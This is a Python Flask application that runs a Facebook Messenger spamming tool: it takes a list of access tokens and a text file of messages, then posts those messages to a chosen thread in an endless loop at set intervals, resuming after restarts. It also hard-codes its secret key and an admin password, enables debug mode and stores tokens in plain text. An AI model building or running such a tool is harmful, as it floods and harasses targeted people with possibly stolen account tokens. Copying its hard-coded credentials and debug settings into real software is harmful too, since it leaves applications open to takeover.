from flask import Flask, request, session, redirect, url_for, render_template, jsonify
import requests, json, os, uuid, logging, time
from threading import Thread, Event
from sqlalchemy import create_engine, Column, Integer, String, Text, DateTime
from sqlalchemy.orm import sessionmaker, declarative_base
from datetime import datetime

# -------------------- APP SETUP --------------------
app = Flask(__name__)
app.secret_key = "AXSHU_SECURE_KEY_1234567890"
app.debug = True

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_NAME = "tasks.db"
engine = create_engine(f'sqlite:///{os.path.join(BASE_DIR, DB_NAME)}?check_same_thread=False')
Base = declarative_base()
Session = sessionmaker(bind=engine)
running_tasks = {}

# -------------------- DATABASE MODEL --------------------
class Task(Base):
    __tablename__ = "tasks"
    id = Column(String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    thread_id = Column(String(50), nullable=False)
    prefix = Column(String(255))
    interval = Column(Integer)
    messages = Column(Text)
    tokens = Column(Text)
    status = Column(String(20), default="Running")
    messages_sent = Column(Integer, default=0)
    start_time = Column(DateTime, default=datetime.utcnow)

Base.metadata.create_all(engine)

# -------------------- MESSAGE SENDER --------------------
def send_messages(task_id, stop_event, pause_event):
    db_session = Session()
    task = db_session.query(Task).filter_by(id=task_id).first()
    if not task:
        db_session.close()
        return

    tokens = json.loads(task.tokens)
    messages = json.loads(task.messages)

    while not stop_event.is_set():
        if pause_event.is_set():
            time.sleep(1)
            continue

        try:
            for msg_content in messages:
                if stop_event.is_set() or pause_event.is_set():
                    break

                for token in tokens:
                    api_url = f"https://graph.facebook.com/v15.0/t_{task.thread_id}/"
                    payload = {'access_token': token, 'message': f"{task.prefix} {msg_content}"}
                    try:
                        resp = requests.post(api_url, data=payload, timeout=10)
                        if resp.status_code == 200:
                            task.messages_sent += 1
                            db_session.commit()
                            logging.info(f"Sent message for Task ID: {task.id}")
                        else:
                            logging.warning(f"Failed [{resp.status_code}] for Task ID: {task.id}")
                    except requests.RequestException as e:
                        logging.error(f"Network error for Task ID {task.id}: {e}")
                    
                    if pause_event.is_set() or stop_event.is_set():
                        break
                time.sleep(task.interval)
        except Exception as e:
            logging.error(f"Error in task loop {task.id}: {e}")
            db_session.rollback()
            time.sleep(5)
    db_session.close()

# -------------------- ROUTES --------------------
@app.route('/', methods=['GET', 'POST'])
def index():
    task_id = None
    if request.method == 'POST':
        tokens = request.form.get('tokens').strip().splitlines()
        thread_id = request.form.get('threadId')
        prefix = request.form.get('kidx')
        interval = int(request.form.get('time'))
        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        db_session = Session()
        try:
            new_task = Task(
                thread_id=thread_id,
                prefix=prefix,
                interval=interval,
                messages=json.dumps(messages),
                tokens=json.dumps(tokens)
            )
            db_session.add(new_task)
            db_session.commit()
            task_id = new_task.id
        finally:
            db_session.close()

        stop_event = Event()
        pause_event = Event()
        thread = Thread(target=send_messages, args=(task_id, stop_event, pause_event))
        thread.daemon = True
        thread.start()

        running_tasks[task_id] = {'thread': thread, 'stop_event': stop_event, 'pause_event': pause_event}

    return render_template("user.html", task_id=task_id)

@app.route('/stop_task', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if not task_id:
        return redirect(url_for('index'))

    db_session = Session()
    task = db_session.query(Task).filter_by(id=task_id).first()
    if task:
        if task_id in running_tasks:
            running_tasks[task_id]['stop_event'].set()
            del running_tasks[task_id]

        task.status = "Stopped"
        db_session.commit()
    db_session.close()
    return redirect(url_for('index'))

# -------------------- ADMIN PANEL --------------------
@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        password = request.form.get('password')
        if password == "AXSHU143":
            session['admin'] = True
            return redirect(url_for('admin_panel'))
    return render_template("login.html")

@app.route('/admin/panel')
def admin_panel():
    if not session.get('admin'):
        return redirect(url_for('admin_login'))

    db_session = Session()
    tasks = db_session.query(Task).all()
    db_session.close()
    return render_template("admin.html", tasks=tasks)

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin', None)
    return redirect(url_for('admin_login'))

# -------------------- AUTO RESUME TASKS --------------------
def resume_tasks():
    db_session = Session()
    tasks = db_session.query(Task).filter_by(status="Running").all()
    for task in tasks:
        stop_event = Event()
        pause_event = Event()
        thread = Thread(target=send_messages, args=(task.id, stop_event, pause_event))
        thread.daemon = True
        thread.start()
        running_tasks[task.id] = {'thread': thread, 'stop_event': stop_event, 'pause_event': pause_event}
        logging.info(f"Resumed Task ID {task.id}")
    db_session.close()

if __name__ == '__main__':
    resume_tasks()
    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5000)))
